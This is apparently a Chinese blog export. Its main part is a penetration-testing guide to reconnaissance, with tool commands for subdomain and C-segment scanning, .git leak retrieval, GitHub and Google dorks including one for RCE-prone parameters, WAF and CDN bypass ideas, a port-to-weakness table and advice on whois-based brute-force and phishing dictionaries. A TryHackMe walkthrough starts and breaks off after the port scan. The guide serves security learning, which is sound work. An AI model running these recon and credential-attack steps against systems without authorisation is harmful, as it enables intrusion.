地址范围，或者是给出一个域名，我们就需要根据给出的资产做信息收集，有些时候如果测试目标是某些公司，我们也可以测试投资占比&gt;51%的子公司，具体情况根据要求来做。</p><p>SRC 挖掘中我们就要根据具体规则进行挖掘，比如 edusrc，我们更多时候可能就是看域名，xxx. edu. cn，这个时候大多数的信息收集方式就是靠子域名或是一些搜索引擎来进行收集；如果是企业 SRC 之类的我们就应该去看具体规则，这里举例几个企业的公告</p><p><a href="https://security.tencent.com/uploadimg_dir/other/TSRC.pdf?v=3.3">TSRC.pdf (tencent.com)</a></p><p><a href="https://src.zhaopin.com/page/view?id=10012">智联招聘安全应急响应中心（ZPSRC）安全漏洞处理标准V3.0 | 智联招聘安全应急响应中心 (zhaopin.com)</a></p><p><a href="https://q2a1fk6o03.feishu.cn/docx/WPOHdeVdLoJgPfx25VmcfVJxnde">🚀字节跳动安全响应中心安全报告处置规则V6.0 - 飞书云文档 (feishu.cn)</a></p><p>再者就是在公司或者 CTF，打靶中的信息收集，这些一般就是开扫，这里不详细说明。（有空再写）</p><p>在做以下步骤之前，推荐几个全套工具，我认为能满足信息收集的大部分要求</p><p>Tscanplus</p><ul><li><a href="https://github.com/TideSec/TscanPlus">TideSec&#x2F;TscanPlus: 一款综合性网络安全检测和运维工具，旨在快速资产发现、识别、检测，构建基础资产信息库，协助甲方安全团队或者安全运维人员有效侦察和检索资产，发现存在的薄弱点和攻击面。 (github.com)</a><br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202407181551022.png" alt="image.png"></li></ul><p>mitan</p><ul><li><a href="https://github.com/kkbo8005/mitan">kkbo8005&#x2F;mitan: 密探渗透测试工具包含资产信息收集，子域名爆破，搜索语法，资产测绘（FOFA，Hunter，quake, ZoomEye），指纹识别，敏感信息采集，文件扫描、密码字典等功能 (github.com)</a><br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202407181552662.png" alt="image.png"></li></ul><p>TangGo<br><a href="https://tanggo.nosugar.tech/">TangGo测试平台 (nosugar.tech)</a><br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202407191932304.png" alt="image.png"></p><p>ARL灯塔（原删库了，这里推荐这个）<br><a href="https://github.com/Aabyss-Team/ARL">Aabyss-Team&#x2F;ARL: ARL官方仓库备份项目：ARL(Asset Reconnaissance Lighthouse)资产侦察灯塔系统旨在快速侦察与目标关联的互联网资产，构建基础资产信息库。 协助甲方安全团队或者渗透测试人员有效侦察和检索资产，发现存在的薄弱点和攻击面。 (github.com)</a></p><p>ShuiZe<br><a href="https://github.com/0x727/ShuiZe_0x727">https://github.com/0x727/ShuiZe_0x727</a></p><p>rengine（据说吃电脑性能，但是功能很全）<br><a href="https://github.com/yogeshojha/rengine">yogeshojha&#x2F;rengine: reNgine is an automated reconnaissance framework for web applications with a focus on highly configurable streamlined recon process via Engines, recon data correlation and organization, continuous monitoring, backed by a database, and simple yet intuitive User Interface. reNgine makes it easy for penetration testers to gather reconnaissance with minimal configuration and with the help of reNgine’s correlation, it just makes recon effortless. (github.com)</a></p><h2 id="2-具体"><a href="#2-具体" class="headerlink" title="2. 具体"></a>2. 具体</h2><h3 id="第一步-归纳信息"><a href="#第一步-归纳信息" class="headerlink" title="第一步:归纳信息"></a>第一步:归纳信息</h3><p>我认为良好的第一步，其实从创建文件夹就开始了<br>前文也提到过，渗透测试大多以团队作战为主，这个时候我们就需要情报共享，所以我们需要挑选一个可以共同编辑的工具<br>这里我推荐语雀或是飞书<br>然后把靶标一个个列上，再加上我们需要收集的内容目录，方便后续快速翻看，也不容易出现打偏之类的现象<br>下面给出一个模板</p><ol><li>企业基础信息收集</li></ol><ul><li>目标企业信息</li><li>所属行业分类</li><li>股权结构信息</li></ul><ol start="2"><li>企业安全防护收集</li></ol><ul><li>供应商关系信息；软件供应链；安全供应商</li><li>防病毒产品</li><li>EDR产品</li><li>NTA产品</li><li>HIDS产品</li><li>SOC产品</li><li>安全运维</li><li>受哪家保护</li></ul><ol start="3"><li>企业互联网资产信息</li></ol><ul><li>互联网资产收集:子域名爆破，空间测绘，端口扫描，web识别</li><li>资产和组件识别：web资产，移动端资产，C&#x2F;S段资产</li><li>供应链资产识别:VPN，OA，Mail，云桌面，CRM，SRM等</li><li>敏感信息收集:邮箱，账号密码，泄露代码</li><li>资产脆弱性识别:供应链资产，框架CMS资产，组件资产</li></ul><ol start="4"><li>企业云上资产<br>打云的目的是要回到本地机房<br>（获取员工数据，获取应用服务器权限，应用沟通交流功能)</li></ol><h3 id="第二步-资产收集"><a href="#第二步-资产收集" class="headerlink" title="第二步:资产收集"></a>第二步:资产收集</h3><h4 id="i-企业资产"><a href="#i-企业资产" class="headerlink" title="i.企业资产"></a>i.企业资产</h4><p>首先我们要找的是这家企业的基本信息，这里给出</p><ul><li><p>零零信安<a href="https://0.zone/">零零信安 | ASM | 攻击面 | 外部攻击面管理专家 | 比攻击者更快一步了解您自己的风险 (0.zone)</a></p></li><li><p>企查查<a href="https://www.qcc.com/">企查查 - 企业工商信息查询系统_查企业_查老板_查风险就上企查查! (qcc.com)</a></p></li><li><p>爱企查<a href="https://aiqicha.baidu.com/">爱企查首页 - 专业企业查询平台 - 查企业 - 查老板 - 查风险 - 工商信息查询系统 (baidu.com)</a></p></li><li><p>天眼查<a href="https://www.tianyancha.com/">天眼查-商业查询平台_企业信息查询_公司查询_工商查询_企业信用信息系统 (tianyancha.com)</a></p></li><li><p>风鸟<a href="https://www.riskbird.com/">风鸟-免费企业查询平台-免费查企业-查失信-查法人-企业信用-工商查询 (riskbird.com)</a></p></li></ul><p>移动端资产：</p><ul><li><p>小蓝本<a href="https://sou.xiaolanben.com/pc">小蓝本-商业信息搜索 (xiaolanben.com)</a></p></li><li><p>七麦<a href="https://www.qimai.cn/">七麦数据 -专业移动产品商业分析平台-关键词优化-ASA优化-七麦科技 (qimai.cn)</a></p></li></ul><p>我们并不需要都用，我平时用得比较多的其实是风鸟（因为它送一年VIP），爱企查（信息比较全，比较直观），零零信安（收集很齐全，就是要钱）这些大多都是起到一个互补的作用，在这些网站中，我们需要重点关注：</p><ol><li>企业架构（集团其它成员，子公司，着重关注&gt;51%控股权的公司，在大部分情况中那些也在攻击目标范围内）</li><li>知识产权（网站备案号，软件著作，公众号，微信、支付宝小程序，APP）</li><li>邮箱（这一点感觉很多人会忽略，其实也有很大的作用）</li><li>网站图标（借助测绘的icon语法搜集网站）</li></ol><p>零零信安</p><p>风鸟</p><p>爱企查</p><p>如果要收集的靶标企业较多，也可以利用工具<br><strong>ENScanGo</strong><br><a href="https://github.com/wgpsec/ENScan_GO">https://github.com/wgpsec/ENScan_GO</a></p><p>各大应用市场收集app</p><p>这里再提一个地方，维基百科或是百度百科，在一些大企业上会帮我们总结好信息，以及一些企业关系</p><h4 id="ii-子域名收集"><a href="#ii-子域名收集" class="headerlink" title="ii.子域名收集"></a>ii.子域名收集</h4><p>在获取一堆主域之后，就是找子域名(我这里仅是尽可能多的把我的思路列举出来，具体的使用根据个人习惯，没有要求说要按照流程走一遍，只要你认为你收集的资产足够你拿下目标就够了)</p><h5 id="a-备案号反查域名（适用国内）"><a href="#a-备案号反查域名（适用国内）" class="headerlink" title="a.备案号反查域名（适用国内）"></a>a.备案号反查域名（适用国内）</h5><p><a href="https://beian.miit.gov.cn/#/Integrated/index">ICP&#x2F;IP地址&#x2F;域名信息备案管理系统 (miit.gov.cn)</a><br><a href="https://tool.chinaz.com/">站长工具 - 站长之家 (chinaz.com)</a><br><a href="https://hunter.qianxin.com/">鹰图平台 (qianxin.com)</a><br>奇安信的备案号反查做的很好</p><h5 id="b-工具爆破"><a href="#b-工具爆破" class="headerlink" title="b.工具爆破"></a>b.工具爆破</h5><p>字典文件[[子域名(18.5w)]]</p><h6 id="Oneforall"><a href="#Oneforall" class="headerlink" title="Oneforall"></a>Oneforall</h6><p><a href="https://github.com/shmilylty/OneForAll">shmilylty&#x2F;OneForAll: OneForAll是一款功能强大的子域收集工具 (github.com)</a><br>python Oneforall.py -d xxx.com<br>python Oneforall.py  -dl xxx.txt</p><h6 id="subfinder"><a href="#subfinder" class="headerlink" title="subfinder"></a>subfinder</h6><p><a href="https://github.com/projectdiscovery/subfinder">projectdiscovery&#x2F;subfinder: Fast passive subdomain enumeration tool. (github.com)</a></p><h6 id="layer"><a href="#layer" class="headerlink" title="layer"></a>layer</h6><p>字典很大，而且穷举加递归，除非你项目没蓝队而且比较大，个人感觉一般用不到，用也是放到vps慢慢跑</p><h5 id="c-DNS查询"><a href="#c-DNS查询" class="headerlink" title="c.DNS查询"></a>c.DNS查询</h5><p><a href="https://dnsdumpster.com/">DNSDumpster.com - dns recon and research, find and lookup dns records</a><br><a href="https://www.virustotal.com/gui/home/search">VirusTotal</a></p><h5 id="d-证书查询"><a href="#d-证书查询" class="headerlink" title="d.证书查询"></a>d.证书查询</h5><p>crt.sh<br><a href="https://crt.sh/">crt.sh | Certificate Search</a><br>censys<br><a href="https://censys.io/">https://censys.io/</a></p><h5 id="e-搜索引擎"><a href="#e-搜索引擎" class="headerlink" title="e.搜索引擎"></a>e.搜索引擎</h5><p>Google<br>site:xxxx.com<br>还可以用-来去掉不想要的子域名，例如：site:xxxx.com -www -vpn</p><p>fofa<br><a href="https://fofa.info/">网络空间测绘，网络空间安全搜索引擎，网络空间搜索引擎，安全态势感知 - FOFA网络空间测绘系统</a><br>hunter<br><a href="https://hunter.qianxin.com/">鹰图平台 (qianxin.com)</a></p><p>360quake<br><a href="https://quake.360.net/quake/#/index">360网络空间测绘 — 因为看见，所以安全</a><br>风里雨里，我都在quake等你。个人中心输入邀请码“dJsltu”你我均可获得5,000长效积分哦，地址 quake.360.net</p><p>zoomeye<br><a href="https://www.zoomeye.org/">首页 - 网络空间测绘,网络安全,漏洞分析,动态测绘,钟馗之眼,时空测绘,赛博测绘 - ZoomEye(“钟馗之眼”)网络空间搜索引擎</a></p><h5 id="f-hosts碰撞"><a href="#f-hosts碰撞" class="headerlink" title="f.hosts碰撞"></a>f.hosts碰撞</h5><p>可能直接突破进内网<br><a href="https://xz.aliyun.com/t/9590?time__1311=n4+xnD0DuA57qxGqGNnmDUxYqHgDclEODzoD">利用HOSTS碰撞突破边界 - 先知社区 (aliyun.com)</a><br>Host_scan</p><h5 id="g-whois查询"><a href="#g-whois查询" class="headerlink" title="g.whois查询"></a>g.whois查询</h5><p>查询网站注册信息<br><a href="http://ipwhois.cnnic.net.cn/">http://ipwhois.cnnic.net.cn/</a><br><a href="https://tool.chinaz.com/">站长工具 - 站长之家 (chinaz.com)</a></p><ol><li><p>在社工库查询邮箱和手机号，若查到，可尝试登陆服务器商或域名商。  </p></li><li><p>利用注册人电话，邮箱等信息通过自由拼接组合成针对网站的社工字典。最后利用字典进行爆破或社工钓鱼，也可用过邮箱和手机号反查找到更多注册域名。  </p></li><li><p>DNS解析记录可以查ip,查NS、mx邮件交换记录。</p></li><li><p>MX记录是邮件服务交换记录，邮件服务经常搭建在目标办公网络，可以让快速我们定位目标核心区域并展开渗透。</p></li></ol><h5 id="h-威胁情报"><a href="#h-威胁情报" class="headerlink" title="h.威胁情报"></a>h.威胁情报</h5><p>打攻防演练的时候，个人认为这是最好用的子域名收集方式，因为这种打点方式不会打草惊蛇，拿别的一扫就黑名单了，很容易收集有误或者不全</p><ul><li><a href="https://ti.360.net/">https://ti.360.net/</a></li><li><a href="https://ti.dbappsecurity.com.cn/">安全星图平台 (dbappsecurity.com.cn)</a></li><li><a href="https://redqueen.tj-un.com/IntelHome.html">RedQueen威胁情报中心 (tj-un.com)</a></li><li><a href="https://www.antiycloud.com/#/antiy/index">https://www.antiycloud.com/#/antiy/index</a></li><li><a href="https://www.virustotal.com/gui/home/upload">VirusTotal - Home</a></li><li><a href="https://securitytrails.com/">SecurityTrails: Data Security, Threat Hunting, and Attack Surface Management Solutions for Security Teams</a></li></ul><h5 id="i-旁站-C段查询"><a href="#i-旁站-C段查询" class="headerlink" title="i.旁站&#x2F;C段查询"></a>i.旁站&#x2F;C段查询</h5><p>nmap -p 80,443,8080 -Pn xxx.xxx.xxx.0&#x2F;24<br>masscan -p 80,443,8080 -Pn –rate&#x3D;    xxx.xxx.xxx.0&#x2F;24</p><p>资产测绘<br>ip&#x3D;”xxx.xxx.xxx.0&#x2F;24”</p><h5 id="URL去重"><a href="#URL去重" class="headerlink" title="URL去重"></a>URL去重</h5><p><a href="http://tools.sbbbb.cn/url-ip/">URL &amp; IP 在线处理工具 (sbbbb.cn)</a></p><h5 id="指纹识别"><a href="#指纹识别" class="headerlink" title="指纹识别"></a>指纹识别</h5><h6 id="EHole"><a href="#EHole" class="headerlink" title="EHole"></a>EHole</h6><p><a href="https://github.com/EdgeSecurityTeam/EHole">EdgeSecurityTeam&#x2F;EHole: EHole(棱洞)3.0 重构版-红队重点攻击系统指纹探测工具 (github.com)</a><br>.\\ehole.exe finger -l .\\domains.txt -o output.xlsx</p><h6 id="Glass"><a href="#Glass" class="headerlink" title="Glass"></a>Glass</h6><p><a href="https://github.com/s7ckTeam/Glass">s7ckTeam&#x2F;Glass: Glass是一款针对资产列表的快速指纹识别工具，通过调用Fofa&#x2F;ZoomEye&#x2F;Shodan&#x2F;360等api接口快速查询资产信息并识别重点资产的指纹，也可针对IP&#x2F;IP段或资产列表进行快速的指纹识别。 (github.com)</a><br>python Glass.py -u <a href="http://www.s7ck.com/">http://www.s7ck.com</a>  &#x2F;&#x2F; 单url测试<br>python Glass.py -w url.txt  &#x2F;&#x2F; url文件内</p><h6 id="Finger"><a href="#Finger" class="headerlink" title="Finger"></a>Finger</h6><p><a href="https://github.com/EASY233/Finger">EASY233&#x2F;Finger: 一款红队在大量的资产中存活探测与重点攻击系统指纹探测工具 (github.com)</a></p><ul><li>-u 对单个URL进行指纹识别</li><li>-f 对指定文件中的url进行批量指纹识别</li><li>-i 对ip进行fofa数据查询采集其web资产</li><li>-if 对指定文件中的ip批量调用fofa进行数据查询采集其web资产</li><li>-fofa 调用fofa api进行资产收集</li><li>-quake 调用360 quake进行资产收集</li><li>-o 指定输出方式默认不选择的话是xlsx格式，支持json，xls。</li></ul><p>还有一些在线的</p><h6 id="潮汐指纹"><a href="#潮汐指纹" class="headerlink" title="潮汐指纹"></a><strong>潮汐指纹</strong></h6><p><a href="http://finger.tidesec.com/">TideFinger 潮汐指纹 TideFinger 潮汐指纹 (tidesec.com)</a></p><h6 id="云悉指纹"><a href="#云悉指纹" class="headerlink" title="云悉指纹"></a><strong>云悉指纹</strong></h6><p><a href="https://www.yunsee.cn/">云悉互联网WEB资产在线梳理|在线CMS指纹识别平台 - 云悉安全平台 (yunsee.cn)</a></p><h3 id="第三步-敏感信息收集"><a href="#第三步-敏感信息收集" class="headerlink" title="第三步:敏感信息收集"></a>第三步:敏感信息收集</h3><h4 id="I-Github"><a href="#I-Github" class="headerlink" title="I.Github"></a>I.Github</h4><p>手工：<br><a href="https://docs.github.com/zh/search-github/searching-on-github/searching-for-repositories">搜索仓库 - GitHub 文档</a></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">in:</span> <span class="hljs-string">name</span> <span class="hljs-string">baidu</span> <span class="hljs-comment">#标题搜索含有关键字baidu</span><br><span class="hljs-attr">in:</span> <span class="hljs-string">descripton</span> <span class="hljs-string">baidu</span> <span class="hljs-comment">#仓库描述搜索含有关键字 </span><br><span class="hljs-attr">in:</span> <span class="hljs-string">readme</span> <span class="hljs-string">baidu</span> <span class="hljs-comment">#Readme文件搜素含有关键字</span><br><span class="hljs-attr">stars:</span> <span class="hljs-string">&gt;</span> <span class="hljs-number">3000 </span><span class="hljs-string">baidu</span> <span class="hljs-comment">#stars数量大于3000的搜索关键字</span><br><span class="hljs-attr">stars:</span> <span class="hljs-number">1000</span><span class="hljs-string">.</span> <span class="hljs-number">.3000</span> <span class="hljs-string">baidu</span> <span class="hljs-comment">#stars数量大于1000小于3000的搜索关键字</span><br><span class="hljs-attr">forks:</span> <span class="hljs-string">&gt;</span> <span class="hljs-number">1000 </span><span class="hljs-string">baidu</span> <span class="hljs-comment">#forks数量大于1000的搜索关键字</span><br><span class="hljs-attr">forks:</span> <span class="hljs-number">1000</span><span class="hljs-string">.</span> <span class="hljs-number">.3000</span> <span class="hljs-string">baidu</span> <span class="hljs-comment">#forks数量大于1000小于3000的搜索关键字</span><br><span class="hljs-attr">size:</span> <span class="hljs-string">&gt;=</span> <span class="hljs-number">5000 </span><span class="hljs-string">baidu</span> <span class="hljs-comment">#指定仓库大于5000k(5 M) 的搜索关键字</span><br><span class="hljs-attr">pushed:</span> <span class="hljs-string">&gt;</span> <span class="hljs-number">2019</span> <span class="hljs-bullet">-</span> <span class="hljs-number">02</span> <span class="hljs-bullet">-</span> <span class="hljs-number">12</span> <span class="hljs-string">baidu</span> <span class="hljs-comment">#发布时间大于2019 - 02 - 12 的搜索关键字</span><br><span class="hljs-attr">created:</span> <span class="hljs-string">&gt;</span> <span class="hljs-number">2019</span> <span class="hljs-bullet">-</span> <span class="hljs-number">02</span> <span class="hljs-bullet">-</span> <span class="hljs-number">12</span> <span class="hljs-string">baidu</span> <span class="hljs-comment">#创建时间大于2019 - 02 - 12 的搜索关键字</span><br><span class="hljs-attr">user:</span> <span class="hljs-string">name</span> <span class="hljs-comment">#用户名搜素</span><br><span class="hljs-attr">license:</span> <span class="hljs-string">apache</span> <span class="hljs-bullet">-</span> <span class="hljs-number">2.0</span> <span class="hljs-string">baidu</span> <span class="hljs-comment">#明确仓库的 LICENSE 搜索关键字</span><br><span class="hljs-attr">language:</span> <span class="hljs-string">java</span> <span class="hljs-string">baidu</span> <span class="hljs-comment">#在java语言的代码中搜索关键字</span><br><span class="hljs-attr">user: baidu in:</span> <span class="hljs-string">name</span> <span class="hljs-string">baidu</span> <span class="hljs-comment">#组合搜索, 用户名baidu的标题含有baidu的</span><br></code></pre></td></tr></table></figure><p>工具：<br>GitDorker(动不动就sleep，感觉不如手工)<br>环境配置：<br>pip3 install -r requirements.txt -i <a href="https://pypi.tuna.tsinghua.edu.cn/simple">https://pypi.tuna.tsinghua.edu.cn/simple</a></p><p>指令：<br>python3 GitDorker.py -q xxxx.com -tf token.txt -d all.txt -o xxx</p><p>.git泄露<br>工具：GitHack<br><a href="https://github.com/lijiejie/GitHack">https://github.com/lijiejie/GitHack</a><br>命令<br>python GitHack.py <a href="http://xxxx.com/.git/">http://xxxx.com/.git/</a></p><h4 id="II-Google-Hacking"><a href="#II-Google-Hacking" class="headerlink" title="II.Google Hacking"></a>II.Google Hacking</h4><p>一键网站：<br><a href="https://pentest-tools.com/information-gathering/google-hacking">https://pentest-tools.com/information-gathering/google-hacking</a></p><p>其它语句：<br>RCE:inurl:cmd | inurl:exec&#x3D; | inurl:query&#x3D; | inurl:code&#x3D; | inurl:do&#x3D; | inurl:run&#x3D; | inurl:read&#x3D; | inurl:ping&#x3D; inurl:&amp; site:example.com</p><p>API:filepicker_key api docs curl</p><h4 id="III-搜索引擎"><a href="#III-搜索引擎" class="headerlink" title="III.搜索引擎"></a>III.搜索引擎</h4><p>合理运用百度，微信搜索，跟googlehacking差不多</p><h4 id="IV-供应链"><a href="#IV-供应链" class="headerlink" title="IV.供应链"></a>IV.供应链</h4><p>zf采购网<br>招标投标公共服务平台<br>公共资源交易中心<br>这个可以通过去打有相同供应链的网站，找薄弱的，扒源码做代码审计</p><h4 id="V-目录扫描"><a href="#V-目录扫描" class="headerlink" title="V.目录扫描"></a>V.目录扫描</h4><p>dirsearch<br>python dirsearch.py -u<br>御剑</p><h4 id="VI-API接口"><a href="#VI-API接口" class="headerlink" title="VI.API接口"></a>VI.API接口</h4><p>插件：findsomething</p><h4 id="VII-WAF探测"><a href="#VII-WAF探测" class="headerlink" title="VII.WAF探测"></a>VII.WAF探测</h4><h5 id="WAF类型"><a href="#WAF类型" class="headerlink" title="WAF类型"></a>WAF类型</h5><h6 id="软件型"><a href="#软件型" class="headerlink" title="软件型"></a>软件型</h6><p>安装在服务器本地，对性能消耗比较多<br>安全狗<br>云锁<br>D盾<br>网防G01<br>护卫神<br>智创<br>宝塔<br>悬镜<br>ModSecurity</p><h6 id="硬件型"><a href="#硬件型" class="headerlink" title="硬件型"></a>硬件型</h6><p>放置在网络链路中<br>绿盟WAF<br>安恒明御<br>启明天清<br>长亭雷池<br>远江盛邦RayWAF<br>天融信TopWAF<br>深信服WAF<br>F5 Advanced WAF</p><h6 id="云上"><a href="#云上" class="headerlink" title="云上"></a>云上</h6><p>主流<br>阿里云盾<br>腾讯云<br>百度云<br>华为云<br>安全狗云<br>创宇盾<br>安恒玄武盾<br>奇安信网站卫士</p><p>肉眼看：<br><a href="https://cloud.tencent.com/developer/article/1872310">Waf识别工具和83个Waf拦截页面-腾讯云开发者社区-腾讯云 (tencent.com)</a></p><h5 id="云WAF绕过思路（类似绕CDN）"><a href="#云WAF绕过思路（类似绕CDN）" class="headerlink" title="云WAF绕过思路（类似绕CDN）"></a>云WAF绕过思路（类似绕CDN）</h5><h6 id="二级域名"><a href="#二级域名" class="headerlink" title="二级域名"></a>二级域名</h6><h6 id="域名历史DNS"><a href="#域名历史DNS" class="headerlink" title="域名历史DNS"></a>域名历史DNS</h6><h6 id="信息泄露漏洞"><a href="#信息泄露漏洞" class="headerlink" title="信息泄露漏洞"></a>信息泄露漏洞</h6><h6 id="全球ping"><a href="#全球ping" class="headerlink" title="全球ping"></a>全球ping</h6><h4 id="VIII-组件框架"><a href="#VIII-组件框架" class="headerlink" title="VIII.组件框架"></a>VIII.组件框架</h4><h4 id="信息收集阶段可能发现的漏洞"><a href="#信息收集阶段可能发现的漏洞" class="headerlink" title="信息收集阶段可能发现的漏洞"></a>信息收集阶段可能发现的漏洞</h4><p>文件泄漏</p><ul><li>svn泄漏</li><li>git泄漏</li><li>hg泄漏</li><li>CVS泄漏</li><li>Bazaar&#x2F;bzr泄漏</li><li>网站备份文件泄漏</li><li>WEB-INF&#x2F;web.xml泄漏</li><li>DS_Store泄漏</li><li>SWP泄漏</li><li>war泄漏</li><li>tomcat泄漏</li><li>IIS短文件名</li></ul><p>组件未授权</p><ul><li>Solr</li><li>swagger</li><li>javaMelody</li><li>RabbitMQ</li><li>Redis</li><li>Rsync</li><li>Kubernetes API Server</li><li>Jenkins</li><li>FTP</li><li>Druid</li><li>Dubbo</li><li>CouchDB</li><li>Atlassian Crowd</li><li>Active MQ</li><li>Docker Registry API</li><li>MongoDB</li><li>Memcache</li><li>Elasticsearch</li><li>Zookeeper</li><li>phpinfo</li><li>目录遍历</li><li>spring env</li><li>密钥泄露</li><li>监控系统</li><li>数据库</li><li>docker数据</li><li>history历史记录</li><li>地图api</li><li>swagger泄露</li><li>sourcemap反编译</li><li>ds文件泄露</li><li>物理绝对路径泄露</li><li>开发api文档泄露</li><li>xml文档树泄露</li><li>docker命令泄露</li></ul><h3 id="第四步-IP"><a href="#第四步-IP" class="headerlink" title="第四步:IP"></a>第四步:IP</h3><p>很多新手会忽略基于端口的渗透，事实上基于端口也有很多漏洞<br>[[端口渗透测试]]</p><h4 id="CDN"><a href="#CDN" class="headerlink" title="CDN"></a>CDN</h4><h5 id="CDN检测"><a href="#CDN检测" class="headerlink" title="CDN检测"></a>CDN检测</h5><p><a href="https://cdn.console.aliyun.com/tool/ipCheck">https://cdn.console.aliyun.com/tool/ipCheck</a></p><h5 id="CDN绕过"><a href="#CDN绕过" class="headerlink" title="CDN绕过"></a>CDN绕过</h5><p>​1.扫描网站泄露信息文件</p><p>​2.内部邮箱，一般邮件系统都在内部，没有经过CDN解析，ping邮件服务器的域名</p><p>​3.分站域名，很多网站主站挂了CDN，但是分站可能没有，可以通过二级域名获取分站ip，可能分站和主站不是同一个ip但是在同一个C段下面的情况，从而判断出</p><p>​4.国外访问，国内的CDN往往只对国内用户的访问加速</p><p>​5.查询域名的历史解析记录<a href="https://uptime.netcraft.com/">https://uptime.netcraft.com/</a></p><p>​6.目标网站如果有自己的APP，可以尝试抓APP数据包找真实ip  </p><p>​7.<a href="https://crt.sh/">https://crt.sh/</a></p><h4 id="端口"><a href="#端口" class="headerlink" title="端口"></a>端口</h4><h5 id="常见端口及其服务与常见漏洞"><a href="#常见端口及其服务与常见漏洞" class="headerlink" title="常见端口及其服务与常见漏洞"></a>常见端口及其服务与常见漏洞</h5><table><thead><tr><th>端口</th><th>服务</th><th>漏洞</th></tr></thead><tbody><tr><td>21&#x2F;69</td><td>FTP&#x2F;TFTP</td><td>弱口令, 匿名访问&#x2F;可写, 敏感信息泄露</td></tr><tr><td>22</td><td>SSH</td><td>弱口令, 远程执行, 后门植入</td></tr><tr><td>23</td><td>Telnet</td><td>弱口令，后门植入</td></tr><tr><td>25</td><td>SMTP</td><td>服务错误配置导致的用户名枚举漏洞, 弱口令, 敏感信息泄露</td></tr><tr><td>53</td><td>DNS</td><td>DNS域传送\DNS缓存投毒\DNS欺骗\利用DNS隧道技术刺透防火墙</td></tr><tr><td>110</td><td>POP3</td><td>弱口令, 敏感信息泄露</td></tr><tr><td>135</td><td>WMI</td><td>弱口令, 远程执行, 后门植入</td></tr><tr><td>143</td><td>IMAP</td><td>弱口令, 敏感信息泄露</td></tr><tr><td>389</td><td>LDAP</td><td>未授权访问, 弱口令, 敏感账号密码泄露</td></tr><tr><td>443</td><td>Exchange</td><td>接口弱口令爆破 eg: Owa,ews,oab,AutoDiscover… pth脱邮件, 敏感信息泄露</td></tr><tr><td>445</td><td>SMB</td><td>弱口令, 远程执行, 后门植入,ms17-010</td></tr><tr><td>873</td><td>Rsync</td><td>未授权, 弱口令, 敏感信息泄露</td></tr><tr><td>1090&#x2F;1099</td><td>JAVA RMI</td><td>反序列化</td></tr><tr><td>1433</td><td>Mysql</td><td>弱口令, 敏感账号密码泄露, 提权, 远程执行, 后门植入</td></tr><tr><td>1521</td><td>ORACLE</td><td>弱口令, 敏感账号密码泄露, 提权, 远程执行, 后门植入</td></tr><tr><td>2049</td><td>NFS</td><td>配置不当</td></tr><tr><td>2181</td><td>ZooKeeper</td><td>未授权访问</td></tr><tr><td>3306</td><td>Mysql</td><td>弱口令, 敏感账号密码泄露, 提权(只适用于部分老系统)</td></tr><tr><td>3389</td><td>RDP</td><td>弱口令, 远程执行, 别人留的shift类后门</td></tr><tr><td>3690</td><td>SVN</td><td>弱口令, 敏感信息泄露</td></tr><tr><td>4848</td><td>GlassFish</td><td>弱口令，认证绕过</td></tr><tr><td>5432</td><td>POSTGRESQL</td><td>弱口令, 敏感信息泄露</td></tr><tr><td>5900</td><td>VNC</td><td>弱口令</td></tr><tr><td>5984</td><td>CouchDB</td><td>未授权访问</td></tr><tr><td>5985</td><td>WinRM</td><td>此项主要针对某些高版本Windows, 弱口令, 远程执行, 后门植入</td></tr><tr><td>6379</td><td>REDIS</td><td>弱口令, 未授权访问, 写文件(webshell,启动项,计划任务), 提权</td></tr><tr><td>7001</td><td>weblogic</td><td>控制台弱口令+部署war包，反序列化</td></tr><tr><td>8848</td><td>nacos</td><td>弱口令，未授权访问，认证绕过，默认密钥(token.secret.key)身份伪造，sql注入，反序列化</td></tr><tr><td>27017</td><td>MongoDB</td><td>弱口令，未授权访问</td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试</tag>
      
      <tag>入门</tag>
      
      <tag>信息收集</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>重生之我在try hack me打靶，励志成为赛博高手-DAY7-Bolt</title>
    <link href="/2024/06/26/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E5%9C%A8try%20hack%20me%E6%89%93%E9%9D%B6%EF%BC%8C%E5%8A%B1%E5%BF%97%E6%88%90%E4%B8%BA%E8%B5%9B%E5%8D%9A%E9%AB%98%E6%89%8B-DAY7-Bolt/"/>
    <url>/2024/06/26/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E5%9C%A8try%20hack%20me%E6%89%93%E9%9D%B6%EF%BC%8C%E5%8A%B1%E5%BF%97%E6%88%90%E4%B8%BA%E8%B5%9B%E5%8D%9A%E9%AB%98%E6%89%8B-DAY7-Bolt/</url>
    
    <content type="html"><![CDATA[<h1 id="重生之我在try-hack-me打靶，励志成为赛博高手-DAY7-Bolt"><a href="#重生之我在try-hack-me打靶，励志成为赛博高手-DAY7-Bolt" class="headerlink" title="重生之我在try hack me打靶，励志成为赛博高手-DAY7-Bolt"></a>重生之我在try hack me打靶，励志成为赛博高手-DAY7-Bolt</h1><p><a href="https://tryhackme.com/r/room/bolt">TryHackMe的 |客房信息 — TryHackMe | Room details</a></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406261111874.png" alt="image-20240401140426104"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406261111890.png" alt="image-20240401141051610"></p><p>先是扫描出三个端口，再进行详细扫描</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406261111894.png" alt="image-20240401141334079"></p><p>22一般就是SSH</p><p>我们看看80</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406261111903.png" alt="image-20240401141234597"></p><p>再看8000</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406261111912.png" alt="image-20240401141413885"></p><p>很明显8000端口就是个CMS</p><p><img 